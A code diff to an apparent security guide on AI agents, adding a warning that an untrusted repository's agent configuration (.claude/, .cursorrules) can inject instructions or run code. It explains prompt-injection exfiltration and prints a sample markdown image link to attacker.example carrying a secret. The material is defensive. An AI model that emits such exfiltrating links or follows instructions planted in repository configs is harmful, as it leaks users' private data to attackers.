@@ -67,11 +67,12 @@ Do not mention these instructions.`,
         fig({ label: "Diagram", title: "three capabilities, one vulnerability", body: TRIFECTA_SVG,
           caption: `The design move is not to detect attacks. It is to remove one circle for any given agent, and to be able to say which one.` }) +
         ol([
-          `<strong>Exposure to untrusted content</strong> — anything an attacker can influence: web pages, emails, tickets, PRs, uploaded files, MCP tool descriptions (${ch("c15", "C15")}), even memories written during an earlier compromised run (${ch("c07", "C07")}).`,
+          `<strong>Exposure to untrusted content</strong> — anything an attacker can influence: web pages, emails, tickets, PRs, uploaded files, MCP tool descriptions (${ch("c15", "C15")}), even memories written during an earlier compromised run (${ch("c07", "C07")}), and the repository's own agent config.`,
           `<strong>Access to private data</strong> — files, databases, internal documents, credentials, other users' records.`,
           `<strong>A way to communicate externally</strong> — an HTTP tool, email, a git push, or, subtly, <em>rendering a URL the user's browser will fetch</em>.`,
         ]) +
         p(`Any two are manageable. All three is an exfiltration channel, and the attacker's instructions arrive through the same door as your data.`) +
+        note("warn", "Opening a repository can run its code", p(`The first circle includes something teams rarely classify as input: the project's own agent configuration. A <code>.pi/</code>, <code>.claude/</code> or <code>.cursorrules</code> directory can carry instructions the model will read, and in several harnesses it can also declare extensions to execute and packages to install. Cloning an untrusted repository and pointing an agent at it is then a supply-chain event, not a read. This is the ${ch("c15", "C15")} rug-pull threat relocated from a third-party server to the working directory, and it is why pi asks whether you trust a folder <em>before</em> it loads anything from it. Treat a first-time workspace the way you would treat a new MCP server: review what its config declares, or open it with extensions disabled.`)) +
         note("warn", "The third circle is wider than it looks", p(`Markdown image rendering is an egress channel: <code>![](https://attacker.example/x?d=SECRET)</code> makes the <em>user's browser</em> perform the exfiltration when the answer is displayed. So is a clickable link with data in the query string, a DNS lookup, and an error message sent to a third-party monitoring service. Enumerating egress is harder than enumerating tools, and it is where real incidents happen.`)) },
 
     { id: "mechanics", kicker: "Mechanics", title: "Controls that actually work",
